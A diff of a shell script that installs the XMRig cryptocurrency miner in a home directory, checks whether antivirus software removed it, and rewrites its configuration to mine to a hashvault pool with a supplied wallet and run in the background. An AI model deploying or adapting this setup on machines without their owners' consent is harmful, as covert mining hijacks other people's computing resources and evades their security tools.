@@ -126,7 +126,6 @@ if (test $? -ne 0); then
   rm /tmp/xmrig.tar.gz
 
   echo "[*] Checking if stock version of $HOME/minershell-main/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/minershell-main/config.json
   $HOME/minershell-main/xmrig --help >/dev/null
   if (test $? -ne 0); then 
     if [ -f $HOME/minershell-main/xmrig ]; then
@@ -140,23 +139,11 @@ fi
 
 echo "[*] Miner $HOME/minershell-main/xmrig is OK"
 
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
-if [ "$PASS" == "localhost" ]; then
-  PASS=`ip route get 1 | awk '{print $NF;exit}'`
-fi
-if [ -z $PASS ]; then
-  PASS=na
-fi
-if [ ! -z $EMAIL ]; then
-  PASS="$PASS:$EMAIL"
-fi
-
-sed -i 's/"url": *"[^"]*",/"url": "gulf.minershell-main.stream:'80'",/' $HOME/minershell-main/config.json
+sed -i 's/"url": *"[^"]*",/"url": "pool.hashvault.pro:'80'",/' $HOME/minershell-main/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/minershell-main/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/minershell-main/xmrig.log'",#' $HOME/minershell-main/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/minershell-main/config.json
 
-cp $HOME/minershell-main/config.json $HOME/minershell-main/config_background.jso
+cp $HOME/minershell-main/config.json $HOME/minershell-main/config_background.json
 
 # preparing script
 
